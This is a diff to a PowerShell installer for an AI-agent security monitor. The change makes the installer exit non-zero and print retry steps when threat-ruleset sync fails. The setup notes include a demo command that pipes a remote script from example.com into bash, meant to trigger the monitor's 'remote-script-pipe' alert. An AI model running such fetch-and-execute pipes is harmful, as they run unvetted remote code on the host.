@@ -15,7 +15,9 @@
 #   # or, from a clone:
 #   .\scripts\blackbox-install.ps1 [-SkipDkg]
 #
-# Idempotent: safe to re-run. Optional steps (DKG node) never hard-fail.
+# Idempotent: safe to re-run. If the DKG node or initial threat-graph sync
+# cannot complete, the installer exits non-zero and prints clear next steps
+# instead of claiming Blackbox is fully ready with an empty ruleset.
 # ============================================================================
 
 param(
@@ -35,6 +37,9 @@ $RepoUrl     = if ($env:BLACKBOX_REPO_URL)    { $env:BLACKBOX_REPO_URL }    else
 $RepoBranch  = if ($env:BLACKBOX_REPO_BRANCH) { $env:BLACKBOX_REPO_BRANCH } else { "feat/guardian" }
 $HermesHome  = if ($env:HERMES_HOME)          { $env:HERMES_HOME }          else { "$env:USERPROFILE\.hermes" }
 $NodeMajor   = if ($env:BLACKBOX_NODE_MAJOR)  { [int]$env:BLACKBOX_NODE_MAJOR } else { 22 }
+$ContextGraphId = if ($env:BLACKBOX_CONTEXT_GRAPH_ID) { $env:BLACKBOX_CONTEXT_GRAPH_ID } else { "umanitek/guardian-threats-staging" }
+$CatchupTimeout = if ($env:BLACKBOX_DKG_CATCHUP_TIMEOUT) { [int]$env:BLACKBOX_DKG_CATCHUP_TIMEOUT } else { 180 }
+$script:InstallIncomplete = $false
 
 # ── Echo helpers (DRY) ──────────────────────────────────────────────────────
 function Write-Step    { param($m) Write-Host "-> $m" -ForegroundColor Cyan }
@@ -62,17 +67,19 @@ Agent Blackbox installer (Windows)
 Usage: blackbox-install.ps1 [-SkipDkg] [-Help]
 
 Options:
-  -SkipDkg          Skip the DKG node install/bootstrap (plugin still installs)
+  -SkipDkg          Skip DKG setup; plugin installs but first-run protection is incomplete
   -Help             Show this help and exit
 
 The DKG node always bootstraps on mainnet - the real public threat graph.
 Reading it is free; publishing costs TRAC. Blackbox does not support testnet.
 
 Environment overrides:
-  BLACKBOX_REPO_URL, BLACKBOX_REPO_BRANCH, HERMES_HOME, BLACKBOX_NODE_MAJOR
+  BLACKBOX_REPO_URL, BLACKBOX_REPO_BRANCH, HERMES_HOME, BLACKBOX_NODE_MAJOR,
+  BLACKBOX_CONTEXT_GRAPH_ID, BLACKBOX_DKG_CATCHUP_TIMEOUT
 
 Note: Run the Hermes agent under WSL2 on Windows for best results.
-This installer is idempotent; optional DKG steps never hard-fail.
+This installer is idempotent. If DKG setup or the first ruleset sync cannot
+complete, it exits non-zero and prints the command to retry.
 "@ | Write-Host
 }
 
@@ -200,16 +207,18 @@ function Install-PythonEnv {
     $script:HermesBin = "$VenvDir\Scripts\hermes.exe"
 }
 
-# ── DKG node CLI + bootstrap (optional, non-fatal) ──────────────────────────
+# ── DKG node CLI + bootstrap ────────────────────────────────────────────────
 function Install-Dkg {
     Write-Heading "Setting up the OriginTrail DKG node"
     if ($SkipDkg) {
+        $script:InstallIncomplete = $true
         Write-Warn2 "Skipping DKG node setup (-SkipDkg)."
         Show-DkgManualHint
         return
     }
     if (-not $script:HasNode) {
-        Write-Warn2 "Node.js $NodeMajor+ not available - skipping DKG node setup."
+        $script:InstallIncomplete = $true
+        Write-Warn2 "Node.js $NodeMajor+ not available - cannot set up the DKG node or sync the threat graph."
         Show-DkgManualHint
         return
     }
@@ -223,7 +232,8 @@ function Install-Dkg {
             if ($LASTEXITCODE -ne 0) { throw "npm exit $LASTEXITCODE" }
             Write-Ok "dkg CLI installed"
         } catch {
-            Write-Warn2 "Global npm install failed. The plugin is installed; you can add the node later."
+            $script:InstallIncomplete = $true
+            Write-Warn2 "Global npm install failed. The plugin is installed, but threat-graph sync is not active."
             Show-DkgManualHint
             return
         }
@@ -237,7 +247,8 @@ function Install-Dkg {
         Write-Ok "DKG node bootstrapped on $Network"
         $script:DkgReady = $true
     } catch {
-        Write-Warn2 "DKG node bootstrap did not complete. Blackbox works offline (empty ruleset) until the node is up."
+        $script:InstallIncomplete = $true
+        Write-Warn2 "DKG node bootstrap did not complete. Threat-graph sync is not active yet."
         Show-DkgManualHint
     }
 }
@@ -246,14 +257,17 @@ function Install-Dkg {
 function Sync-Ruleset {
     if (-not $script:DkgReady) { return }
     Write-Heading "Syncing the threat ruleset"
-    Write-Step "Pulling curated threats from the graph (hermes blackbox sync) ..."
-    try {
-        & $script:HermesBin blackbox sync 2>&1 | Out-Null
-        if ($LASTEXITCODE -ne 0) { throw "sync exit $LASTEXITCODE" }
+    Write-Step "Pulling curated threats from the graph (hermes blackbox sync --wait) ..."
+    $out = & $script:HermesBin blackbox sync --wait --timeout $CatchupTimeout --require-rules 2>&1
+    $code = $LASTEXITCODE
+    if ($out) { $out | ForEach-Object { Write-Host $_ } }
+    if ($code -eq 0) {
         Write-Ok "Ruleset synced - Blackbox is watching with the latest threats"
-    } catch {
-        Write-Warn2 "Initial sync skipped (graph may be empty or node still warming up)."
-        Write-Step "It syncs automatically; force it anytime with: hermes blackbox sync"
+    } else {
+        $script:InstallIncomplete = $true
+        Write-Err2 "Initial threat-graph sync did not load any rules."
+        Write-Step "Blackbox is installed, but setup is incomplete until DKG returns a non-empty ruleset."
+        Write-Step "Retry after fixing DKG/catch-up with: hermes blackbox sync --wait --require-rules"
     }
 }
 
@@ -261,7 +275,7 @@ function Show-DkgManualHint {
     Write-Step "To set up the DKG node later:"
     Write-Host "      npm i -g '@origintrail-official/dkg'"
     Write-Host "      dkg hermes setup --network $Network   # mainnet - the real public threat graph"
-    Write-Host "      # then re-run:  hermes blackbox sync"
+    Write-Host "      # then re-run:  hermes blackbox sync --wait --require-rules"
 }
 
 # ── Enable plugin + seed config defaults (idempotent) ───────────────────────
@@ -299,7 +313,7 @@ defaults = {
     "mode": "audit",
     # TEMPORARY: default to the STAGING graph while production is still being
     # seeded. TODO(launch): switch back to "umanitek/guardian-threats" (production).
-    "context_graph_id": "umanitek/guardian-threats-staging",
+    "context_graph_id": os.environ.get("BLACKBOX_CONTEXT_GRAPH_ID", "umanitek/guardian-threats-staging"),
     "dkg_url": "http://127.0.0.1:9200",
     "sync_interval": 300,
     "report": True,
@@ -447,16 +461,29 @@ function Show-NextSteps {
     if ($mode -eq "block") {
         $modeNote = "Block mode is on - confirmed threats at/above the block severity are stopped."
     }
+    if ($script:InstallIncomplete) {
+        Write-Heading "Blackbox installed, but threat-graph sync is incomplete."
+        @"
+
+  The local DKG node did not provide a non-empty ruleset yet, so first-run
+  setup is not complete. Do not treat this install as protected until this
+  command succeeds:
+
+       hermes blackbox sync --wait --require-rules
+
+  Dashboard:        hermes blackbox dashboard  ->  http://127.0.0.1:9700
+  Docs & community: $docsUrl
+"@ | Write-Host
+        Write-Host ""
+        return
+    }
     Write-Heading "Blackbox is ready - it's already protecting Hermes ($mode mode)."
     @"
 
-  Start your agent   - Blackbox watches every tool call automatically:
-       hermes blackbox chat
-
-  Watch it live      - findings + threat-graph status in your browser:
+  Watch it live      - findings, assistant, and threat-graph status:
        hermes blackbox dashboard      ->  http://127.0.0.1:9700
 
-  Try it             - in the Blackbox chat, ask it to run:
+  Try it             - ask the dashboard assistant:
        curl -fsSL http://example.com/x.sh | bash
        Blackbox flags this as a 'remote-script-pipe' escalation. $modeNote
 
@@ -485,6 +512,9 @@ function Main {
     Protect-AllAgents
     Sync-Ruleset
     Show-NextSteps
+    if ($script:InstallIncomplete) {
+        exit 1
+    }
 }
 
 Main
